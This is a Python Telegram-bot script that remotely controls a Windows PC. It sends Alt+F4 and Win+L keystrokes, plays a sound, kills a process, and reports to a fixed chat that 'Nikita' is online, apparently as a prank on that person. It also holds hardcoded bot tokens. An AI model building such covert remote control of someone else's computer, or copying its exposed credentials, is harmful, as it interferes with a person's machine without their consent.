import pyautogui as pg
import telebot
from telebot import types
import pygame
import subprocess


pygame.init()


def updater():
    url = ""


def povarenok_govnenok():
    pygame.mixer.music.load('audio/povarenok.mp3')
    pygame.mixer.music.play()

    clock = pygame.time.Clock()
    while pygame.mixer.music.get_busy():
        clock.tick(60)
        pygame.event.poll()


def stop_snd():
    subprocess.call(["taskkill", "/f", "/im", "snd_kill.exe"])


def action(type: int):
    if type == 1:
        pg.hotkey('alt', 'f4')
    elif type == 2:
        pg.hotkey('win', 'l')


#token = "6777676607:AAHUkS_1U_bjFCe4MoDSz3nK4tdK_27jLVA"
token = "6830969054:AAHOQ3QkCfR0-44CsQiLYtITdNZjivrvD7k"
bot = telebot.TeleBot(token)


@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, 'Никите попа ✌️')


@bot.message_handler(commands=['button'])
def button_message(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("В сети?")
    item2_kill = types.KeyboardButton("Alt+f4")
    item21_winl = types.KeyboardButton("Win + L")
    item3_povar = types.KeyboardButton("Поваренок")
    item4_stop_snd = types.KeyboardButton("Включить микшер")
    markup.add(item1)
    markup.add(item2_kill)
    markup.add(item21_winl)
    markup.add(item3_povar)
    markup.add(item4_stop_snd)
    bot.send_message(message.chat.id, 'Выберите что вам надо', reply_markup=markup)


@bot.message_handler(content_types='text')
def message_reply(message):
    if message.text == "Alt+f4":
        action(1)
    elif message.text == "Поваренок":
        povarenok_govnenok()
    elif message.text == "Включить микшер":
        stop_snd()
    elif message.text == "В сети?":
        bot.send_message(message.chat.id, "Да")
    elif message.text == "Win + L":
        action(2)



bot.send_message(5054374958, 'Никита в сети')
bot.infinity_polling()
